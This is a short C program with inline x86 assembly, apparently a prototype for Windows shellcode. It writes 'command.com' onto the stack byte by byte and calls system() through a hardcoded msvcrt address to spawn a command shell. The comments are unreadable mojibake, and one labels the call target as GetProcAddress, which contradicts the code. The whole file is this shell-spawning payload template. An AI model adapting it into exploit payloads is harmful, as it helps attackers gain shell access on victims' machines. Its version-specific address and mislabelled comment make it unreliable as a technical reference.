#include <windows.h>
#include <winbase.h>
void main()
{
       LoadLibrary("msvcrt.dll");
       __asm {
               mov esp,ebp                 ;��ebp�����ݸ�ֵ��esp
               push ebp                    ;����ebp��esp��4
               mov ebp,esp                 ;��ebp����ֵ������Ϊ�ֲ������Ļ�ָ��
               xor edi,edi                 ;
               push edi                    ;ѹ��0��esp��4��
                                           ;�����ǹ����ַ����Ľ�β\0�ַ���
               sub esp,08h                 ;�������棬һ����12���ֽڣ�
                                           ;������"command.com"��
               mov byte ptr [ebp-0ch],63h  ;
               mov byte ptr [ebp-0bh],6fh  ;
               mov byte ptr [ebp-0ah],6dh  ;
               mov byte ptr [ebp-09h],6Dh  ;
               mov byte ptr [ebp-08h],61h  ;
               mov byte ptr [ebp-07h],6eh  ;
               mov byte ptr [ebp-06h],64h  ;
               mov byte ptr [ebp-05h],2Eh  ;
               mov byte ptr [ebp-04h],63h  ;
               mov byte ptr [ebp-03h],6fh  ;
               mov byte ptr [ebp-02h],6dh  ;���ɴ�"command.com".
               lea eax,[ebp-0ch]           ;
               push eax                    ;����ַ��Ϊ������ջ
               mov eax, 0x77bf8044         ;GetProcAddress API��ڵ�ַ
               call eax                    ;����system
       }
}

